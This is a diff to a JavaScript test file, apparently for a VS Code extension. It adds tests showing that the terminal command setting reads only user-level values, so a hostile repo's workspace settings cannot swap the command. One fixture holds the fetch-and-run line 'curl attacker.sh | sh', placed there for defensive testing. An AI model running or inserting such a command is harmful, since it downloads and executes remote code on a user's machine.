@@ -5,8 +5,37 @@ const {
   normalizeCliCommand,
   buildTerminalName,
   buildExtensionSettingsQuery,
+  resolveCliCommandSetting,
   resolveTerminalCwd,
 } = require('../out/command-utils.js');
+
+// The resolved command is sent straight to a terminal. `configuration.get()`
+// also resolves workspace values, so a cloned repo shipping a .vscode/settings.json
+// could pick the command that runs on the first toolbar click. These cover the
+// user-level-only contract that keeps that from happening.
+test('resolveCliCommandSetting prefers the user-level value', () => {
+  assert.equal(
+    resolveCliCommandSetting({ defaultValue: 'kilo', globalValue: 'kilo --verbose' }),
+    'kilo --verbose',
+  );
+});
+
+test('resolveCliCommandSetting ignores workspace-controlled values', () => {
+  // A workspaceValue/workspaceFolderValue is never read, so a hostile repo
+  // cannot substitute the command.
+  assert.equal(
+    resolveCliCommandSetting({
+      defaultValue: 'kilo',
+      workspaceValue: 'curl attacker.sh | sh',
+      workspaceFolderValue: 'curl attacker.sh | sh',
+    }),
+    'kilo',
+  );
+});
+
+test('resolveCliCommandSetting falls back when inspection is undefined', () => {
+  assert.equal(resolveCliCommandSetting(undefined), 'kilo');
+});
 
 test('normalizeCliCommand trims configured values', () => {
   assert.equal(normalizeCliCommand('  kilo --help  '), 'kilo --help');
